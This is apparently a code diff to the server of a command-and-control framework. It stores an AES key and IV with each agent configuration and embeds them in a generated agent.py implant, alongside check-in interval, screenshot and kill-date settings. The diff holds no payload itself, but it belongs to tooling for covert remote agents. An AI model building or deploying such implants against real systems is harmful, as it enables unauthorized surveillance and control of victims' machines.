@@ -677,15 +677,17 @@ def init_api_routes(app, socketio):
                 'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
                 'killdate_enabled': killdate_enabled,
                 'killdate': killdate_value if killdate_enabled else "",
-                'trusted_certificate': bool(data.get('trusted_certificate', False))
+                'trusted_certificate': bool(data.get('trusted_certificate', False)),
+                'aes_key': CONFIG.aes_key.decode('latin-1'),  # Convert bytes to string for storage
+                'aes_iv': CONFIG.aes_iv.decode('latin-1')     # Convert bytes to string for storage
             }
 
             # Save agent configuration to database
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
-            c.execute('''INSERT INTO agent_configurations 
-                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate, timestamp)
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+            c.execute('''INSERT INTO agent_configurations
+                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate, aes_key, aes_iv, timestamp)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                       (config['checkin_interval'],
                        config['server_url'],
                        int(config['take_screenshots']),
@@ -693,6 +695,8 @@ def init_api_routes(app, socketio):
                        int(config['killdate_enabled']),
                        config['killdate'],
                        int(config['trusted_certificate']),
+                       config['aes_key'],
+                       config['aes_iv'],
                        datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
             conn.commit()
             conn.close()
@@ -710,7 +714,9 @@ def init_api_routes(app, socketio):
                 take_screenshots=str(config['take_screenshots']),
                 screenshot_frequency=config['screenshot_frequency'],
                 killdate_enabled=str(config['killdate_enabled']),
-                killdate=config['killdate'] if config['killdate_enabled'] else ""
+                killdate=config['killdate'] if config['killdate_enabled'] else "",
+                aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
+                aes_iv=repr(CONFIG.aes_iv)     # Keep as bytes object
             )
 
             agent_path = os.path.join(agents_dir, 'agent.py')
